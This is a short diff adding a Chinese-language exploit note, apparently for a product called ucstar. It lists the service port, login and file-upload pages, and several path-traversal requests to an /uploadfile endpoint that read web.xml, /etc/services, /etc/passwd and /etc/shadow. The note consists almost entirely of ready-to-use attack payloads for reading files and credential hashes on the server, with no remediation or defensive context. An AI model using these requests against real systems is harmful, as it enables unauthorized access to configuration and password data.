@@ -1,0 +1,10 @@
+ucstar
+端口： 9090
+[host]:9090/login.jsp  登录界面
+[host]:9090/webcall_chat/leaveMessage.jsp  文件上传
+
+文件读取
+/uploadfile?istrade=istrade&filename=../WEB-INF/web.xml
+/uploadfile?istrade=istrade&filename=../../../../../etc/services
+//uploadfile?istrade=istrade&filename=../../../../../etc/passwd
+/uploadfile?istrade=istrade&filename=../../../../../etc/shadow
